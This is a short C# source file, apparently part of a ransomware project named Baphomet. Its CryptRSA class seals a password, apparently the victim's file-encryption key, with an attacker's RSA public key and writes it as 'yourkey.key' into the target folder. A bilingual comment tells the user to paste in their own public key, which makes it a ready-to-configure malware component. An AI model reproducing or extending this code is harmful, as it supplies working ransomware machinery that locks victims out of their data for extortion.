using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class CryptRSA
    {
        public  void EncryptText(string targetPath ,string password)
        {
            //Pega tu llave publica aqui! / Paste your public key here!
            string publicKey = "<RSAKeyValue><Modulus>tpcAXMZ/5x8/ePQKSzMnby42PtPjhNwS4DqPmmFGjaU6iJpOV9NVuU0AGFc02sEz0FGjdCDRWlmtP1VHMf0GdRQmL9eTQYT/fTu2ivEEKQi314RMTH7QJpsLxx5xy4OaqTaRbD8VuFuFC1EMYWffnZSOcz9abn0GpxecbWpRPpk=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            // Convierto el password a un array byte 
            UnicodeEncoding byteConverter = new UnicodeEncoding();
            byte[] dataToEncrypt = byteConverter.GetBytes(password);

            // Creo un array byte para almazenar la data encriptada(password)  
            byte[] encryptedData;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                // Set rsa pulic key   
                rsa.FromXmlString(publicKey);

                encryptedData = rsa.Encrypt(dataToEncrypt, false);
            }
             File.WriteAllBytes(targetPath + "\\yourkey.key", encryptedData);
        }
    }
}
